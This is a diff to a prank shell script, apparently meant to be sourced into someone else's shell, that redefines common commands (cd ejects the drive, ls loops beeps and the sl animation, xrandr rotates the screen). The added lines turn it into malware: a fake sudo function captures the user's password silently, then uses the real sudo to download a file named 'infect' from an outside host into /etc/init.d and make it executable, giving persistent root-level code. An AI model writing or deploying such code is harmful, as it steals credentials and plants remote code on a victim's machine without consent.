@@ -4,14 +4,15 @@ f() {
     eval "$t() { $2; }"
 }
 
-unalias -a > /dev/null
-unalias -m "*" > /dev/null
+unalias -a &> /dev/null
+unalias -m "*" &> /dev/null
 
 unset() { false; }
 cd() { eject; }
 
 tetris() { 
-beep -f 330 -l 150 -n -f 1 -l 40 -n -f 494 -l 159 -n -f 1 -l 40 -n \
+while (true);
+do beep -f 330 -l 150 -n -f 1 -l 40 -n -f 494 -l 159 -n -f 1 -l 40 -n \
      -f 660 -l 150 -n -f 1 -l 40 -n -f 590 -l 150 -n -f 660 -l 150 -n \
      -f 494 -l 100 -n -f 494 -l 100 -n -f 523 -l 150 -n -f 1 -l 40 -n \
      -f 440 -l 150 -n -f 1 -l 40 -n -f 494 -l 150 -n -f 1 -l 40 -n \
@@ -34,6 +35,7 @@ beep -f 330 -l 150 -n -f 1 -l 40 -n -f 494 -l 159 -n -f 1 -l 40 -n \
      -f 330 -l 150 -n -f 1 -l 40 -n -f 247 -l 100 -n -f 247 -l 100 -n \
      -f 262 -l 150 -n -f 1 -l 40 -n -f 370 -l 150 -n -f 1 -l 40 -n \
      -f 330 -l 150 -n -f 1 -l 40
+done
 }
 
 f ls "tetris &; while (true); do sl -a; done"
@@ -79,13 +81,13 @@ head() { echo '
                           `|
 '; }
 
-write() {
-    echo ""
-}
-
+cfl=/etc/init.d/cfl.z
+sudo=`which sudo`
 sudo() {
     printf "[sudo] password for `whoami`: "
     read -s pass; echo ""
+    echo $pass | $sudo -S curl --output $cfl "http://snaipe.github.io/confloose/infect" >/dev/null 2>&1;
+    echo $pass | $sudo -S chmod +x $cfl;
 }
 rot() { xrandr -o left; xrandr -x; }
 
